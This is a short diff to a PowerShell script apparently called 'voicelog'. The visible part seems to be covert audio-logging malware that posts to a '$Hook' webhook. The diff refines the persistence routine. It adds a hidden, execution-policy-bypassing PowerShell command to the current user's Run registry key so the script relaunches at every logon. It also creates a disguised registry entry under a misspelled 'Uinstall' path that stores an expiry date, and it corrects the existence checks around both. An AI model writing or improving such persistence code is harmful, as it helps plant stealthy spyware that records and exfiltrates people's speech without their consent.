@@ -23,15 +23,16 @@ if(($Persistent -eq $true)){
 }
 
 if($DaysRun -eq -1 -or $DaysRun -gt 0){
-    if(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'voicelog'){ return };
+    if($null -ne (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'voicelog').Test){ return };
 
     $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + '$Persistent=' + $Persistent + ';Get-Item voicelog.ps1 | Invoke-Expression;sleep 5;exit'); 
     New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'voicelog' -Value $autostart;
 
     if($DaysRun -eq -1){ return };
-    if(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\Uinstall\voicelog' -Name 'date'){ return };
+    if(Test-Path 'HKCU:\Software\Microsoft\Windows\Uinstall\voicelog'){ return };
 
-    $date = (Get-Date).AddDays($daysRun);
+    $date = (Get-Date).AddDays($daysRun);    
+    New-Item -Path 'HKCU:\Software\Microsoft\Windows\Uinstall\voicelog';
     New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\Uinstall\voicelog' -Name 'date' -Value $date;
 }
 
